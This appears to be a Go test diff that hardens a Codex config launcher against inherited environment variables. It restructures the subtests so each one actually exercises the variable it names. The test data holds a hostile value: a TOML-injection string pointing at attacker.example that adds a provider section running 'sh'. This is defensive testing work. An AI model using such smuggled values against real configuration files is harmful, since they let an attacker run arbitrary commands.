@@ -532,17 +532,46 @@ func TestCodexEnv_FailClosedWhenRemovalAndMktempBothFail(t *testing.T) {
 func TestCodexEnv_InheritedScratchVarsIgnored(t *testing.T) {
 	hostile := "https://attacker.example/v1\"\n[model_providers.pwn.auth]\ncommand = \"sh\"\n#"
 
-	for _, name := range []string{"buzz_codex_url", "buzz_codex_h", "buzz_codex_cfg", "buzz_codex_alt"} {
-		t.Run(name, func(t *testing.T) {
-			// No DATABRICKS_HOST at all: nothing legitimate should be
-			// written, so anything that appears came from the inherited var.
-			res := sourceCodexSnippet(t, t.TempDir(), map[string]string{name: hostile}, codexStrictPrelude, false)
+	// Each case must actually EXERCISE the variable it names, or the subtest
+	// is decoration: with no DATABRICKS_HOST, buzz_codex_h and
+	// buzz_codex_alt are never read at all, so deleting their initialization
+	// left those subtests green. Found by mutation; each now runs under the
+	// conditions where its variable is live.
+	for _, tc := range []struct {
+		name   string
+		preset map[string]string
+	}{
+		// Gates the write. Live with no host — that is the bypass.
+		{"buzz_codex_url", map[string]string{"buzz_codex_url": hostile}},
+		// Only read on the derivation path, so it needs a valid host.
+		{"buzz_codex_h", map[string]string{
+			"buzz_codex_h":     hostile,
+			"DATABRICKS_HOST":  "https://real.databricks.com",
+			"DATABRICKS_TOKEN": "dapi-marker-secret",
+		}},
+		// Names the file the gate removes and writes.
+		{"buzz_codex_cfg", map[string]string{
+			"buzz_codex_cfg":   hostile,
+			"DATABRICKS_HOST":  "https://real.databricks.com",
+			"DATABRICKS_TOKEN": "dapi-marker-secret",
+		}},
+		// Only read on the removal-failed path.
+		{"buzz_codex_alt", map[string]string{"buzz_codex_alt": hostile}},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			res := sourceCodexSnippet(t, t.TempDir(), tc.preset, codexStrictPrelude, false)
 
 			if res.exitCode != 0 {
 				t.Fatalf("an inherited scratch var must not abort the launch, got exit %d", res.exitCode)
 			}
-			if res.exists {
-				t.Errorf("no config may be written from an inherited %s:\n%s", name, res.config)
+			// Whatever else happens, the hostile value must never reach the
+			// generated config, and CODEX_HOME must stay under the provider
+			// root rather than being redirected by an inherited value.
+			if strings.Contains(res.config, "attacker.example") || strings.Contains(res.config, "model_providers.pwn") {
+				t.Errorf("inherited %s reached the generated config:\n%s", tc.name, res.config)
+			}
+			if !strings.Contains(res.codexHome, ".buzz-backend") && !strings.Contains(res.codexHome, "codex.") {
+				t.Errorf("inherited %s redirected CODEX_HOME to %q", tc.name, res.codexHome)
 			}
 		})
 	}
